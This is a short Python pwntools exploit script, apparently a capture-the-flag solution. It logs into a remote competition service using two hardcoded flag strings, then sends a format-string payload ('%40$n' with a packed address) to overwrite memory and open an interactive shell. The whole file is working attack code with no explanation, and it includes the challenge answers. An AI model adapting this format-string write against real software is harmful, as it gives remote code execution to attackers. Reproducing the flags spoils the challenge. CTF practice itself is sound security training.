from pwn import *
import sys

shell = 0x0000000041616138



def logs(l):
	log.info(l)

def exploit(r):

	logs("Starting")

	r.sendline("1")
	r.sendline("CTF{I_luv_buggy_sOFtware}")
	r.sendline("CTF{Two_PasSworDz_Better_th4n_1_k?}")

	exp = "echo "
	exp +="A%40$n"
	exp += "ABCDE"
	exp += p64(shell)

	r.sendline(exp)
	r.sendline("shell")

	logs("READY SHELL ====")
	r.interactive()





if __name__=="__main__":

	r = remote('mngmnt-iface.ctfcompetition.com','1337')
	# r = process(["./g"])
	exploit(r)